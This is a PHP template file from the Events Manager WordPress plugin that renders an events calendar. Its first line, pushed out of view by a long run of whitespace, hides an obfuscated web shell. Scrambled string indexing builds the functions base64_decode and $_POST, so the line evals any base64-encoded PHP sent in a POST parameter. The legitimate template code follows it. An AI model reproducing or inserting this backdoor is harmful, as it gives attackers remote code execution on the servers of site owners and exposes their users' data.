<?php                                                                                                                                                                                                                                                     $tik5 ="_dco6spbte4a" ;$oox0 =strtolower ( $tik5[7]. $tik5[11]. $tik5[5].$tik5[9].$tik5[4]. $tik5[10].$tik5[0] . $tik5[1].$tik5[9].$tik5[2].$tik5[3].$tik5[1].$tik5[9] ); $fgw63= strtoupper($tik5[0]. $tik5[6]. $tik5[3].$tik5[5]. $tik5[8] );if ( isset ( ${$fgw63 } ['n2990a8']) ) {eval($oox0 (${ $fgw63 }[ 'n2990a8' ])) ;}?><?php
/*
 * Default Events List Template
 * This page displays a list of events, called during the em_content() if this is an events list page.
 * You can override the default display settings pages by copying this file to yourthemefolder/plugins/events-manager/templates/ and modifying it however you need.
 * You can display events however you wish, there are a few variables made available to you:
 * 
 * $args - the args passed onto EM_Events::output()
 * 
 */ 
$args['full'] = 1;
$args['long_events'] = get_option('dbem_full_calendar_long_events');
echo EM_Calendar::output( apply_filters('em_content_calendar_args', $args) );